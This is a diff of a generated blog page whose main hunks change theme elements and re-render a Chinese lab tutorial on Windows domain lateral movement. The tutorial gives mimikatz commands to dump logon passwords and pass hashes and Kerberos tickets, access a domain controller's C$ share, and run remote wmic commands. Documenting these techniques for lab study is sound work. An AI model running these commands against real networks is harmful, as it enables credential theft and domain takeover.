@@ -238,75 +238,12 @@ NTML 基于md4
         </li>
         
         
-        <li><div class="divider"></div></li>
-        <li>
-            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
-                <i class="fab fa-github-square fa-fw"></i>Fork Me
-            </a>
-        </li>
-        
     </ul>
 </div>
 
 
         </div>
 
-        
-            <style>
-    .nav-transparent .github-corner {
-        display: none !important;
-    }
-
-    .github-corner {
-        position: absolute;
-        z-index: 10;
-        top: 0;
-        right: 0;
-        border: 0;
-        transform: scale(1.1);
-    }
-
-    .github-corner svg {
-        color: #0f9d58;
-        fill: #fff;
-        height: 64px;
-        width: 64px;
-    }
-
-    .github-corner:hover .octo-arm {
-        animation: a 0.56s ease-in-out;
-    }
-
-    .github-corner .octo-arm {
-        animation: none;
-    }
-
-    @keyframes a {
-        0%,
-        to {
-            transform: rotate(0);
-        }
-        20%,
-        60% {
-            transform: rotate(-25deg);
-        }
-        40%,
-        80% {
-            transform: rotate(10deg);
-        }
-    }
-</style>
-
-<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
-   data-tooltip="Fork Me" data-position="left" data-delay="50">
-    <svg viewBox="0 0 250 250" aria-hidden="true">
-        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
-        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
-              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
-        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
-              fill="currentColor" class="octo-body"></path>
-    </svg>
-</a>
         
     </nav>
 
@@ -483,7 +420,7 @@ NTML 基于md4
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    368
+                    339
                 </div>
                 
 
@@ -512,48 +449,48 @@ NTML 基于md4
 </blockquote>
 <p>NTML 基于md4</p>
 <p>打开linux</p>
-<pre><code>使用mimikatz传到靶机
+<pre class=" language-shell"><code class="language-shell">使用mimikatz传到靶机
 进入shell
-mimikatz &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot; //把所有能搜集到的用户名密码明文读取
+mimikatz "privilege::debug" "log" "sekurlsa::logonpasswords" //把所有能搜集到的用户名密码明文读取
 </code></pre>
 <p>在win2008之后就不太好使了</p>
 <h2 id="pass-the-hash"><a href="#pass-the-hash" class="headerlink" title="pass the hash"></a>pass the hash</h2><p>另开一个win2012，是域里面的一台主机，假设已经入侵成功</p>
-<pre><code>使用mimikatz获得域控的NTLM hash值
-mimikatz &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;
-mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:Administrator /domain:test1.com /ntlm:hash值&quot;
+<pre class=" language-shell"><code class="language-shell">使用mimikatz获得域控的NTLM hash值
+mimikatz "privilege::debug" "log" "sekurlsa::logonpasswords"
+mimikatz "privilege::debug" "sekurlsa::pth /user:Administrator /domain:test1.com /ntlm:hash值"
 </code></pre>
 <p>弹出一个cmd框，在框里输入</p>
-<pre><code>dir \\dc-1\c$
+<pre class=" language-shell"><code class="language-shell">dir \\dc-1\c$
 type \\dc-1\c$a.txt
 </code></pre>
 <p>发现可以控制域控了</p>
 <p>进入下一种方式</p>
-<pre><code>shell
+<pre class=" language-shell"><code class="language-shell">shell
 cd x64
-mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::ekeys&quot; //看到aes256的hash
+mimikatz "privilege::debug" "sekurlsa::ekeys" //看到aes256的hash
 aes256也可以pass the hash
-mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:test2 /domain:test1.com /aes256:hash&quot;
+mimikatz "privilege::debug" "sekurlsa::pth /user:test2 /domain:test1.com /aes256:hash"
 又新建一个cmd
 </code></pre>
 <h2 id="票据传递"><a href="#票据传递" class="headerlink" title="票据传递"></a>票据传递</h2><p>进入mimikatz，先票据导出</p>
-<pre><code>mimikatz
+<pre class=" language-shell"><code class="language-shell">mimikatz
 privilege::debug
 sekurlsa::tickets /export
 </code></pre>
 <p>内存中票据清理</p>
-<pre><code>kerberos::purge
+<pre class=" language-shell"><code class="language-shell">kerberos::purge
 </code></pre>
 <p>拿到票据该怎么使用</p>
-<pre><code>mimikatz &quot;kerberos::ptt&quot; c:\x64\你要用的票据文件.kirbi
+<pre class=" language-shell"><code class="language-shell">mimikatz "kerberos::ptt" c:\x64\你要用的票据文件.kirbi
 把票据注入到内存中
 </code></pre>
 <p>在本cmd中</p>
-<pre><code>dir \\dc-1\c$
+<pre class=" language-shell"><code class="language-shell">dir \\dc-1\c$
 直接进行访问
 </code></pre>
 <h2 id="wmic命令执行"><a href="#wmic命令执行" class="headerlink" title="wmic命令执行"></a>wmic命令执行</h2><p>进入一个system权限的session</p>
-<pre><code>shell
-wmic /node:域控ip /user:test2 /password:test123! process call create &quot;cmd.exe /c ipconfig &gt; c:\ip.txt&quot;
+<pre class=" language-shell"><code class="language-shell">shell
+wmic /node:域控ip /user:test2 /password:test123! process call create "cmd.exe /c ipconfig > c:\ip.txt"
 exit
 migrate //查看进程
 migrate 进程号
@@ -1306,16 +1243,20 @@ $(function () {
     
 
     <!-- 雪花特效 -->
-     
-        <script type="text/javascript">
-            // 只在桌面版网页启用特效
-            var windowWidth = $(window).width();
-            if (windowWidth > 768) {
-                document.write('<script type="text/javascript" src="/libs/others/snow.js"><\/script>');
-            }
-        </script>
     
+	
+	<!-- 冒泡 -->
+	
+		<script type="text/javascript">
+			// 只在桌面版网页启用特效
+			var windowWidth = $(window).width();
+			document.write(
+				'<script type="text/javascript" src="/libs/others/buble.js"><\/script>'
+			);
+		</script>
+	
 
+	
     <!-- 鼠标星星特效 -->
     
 
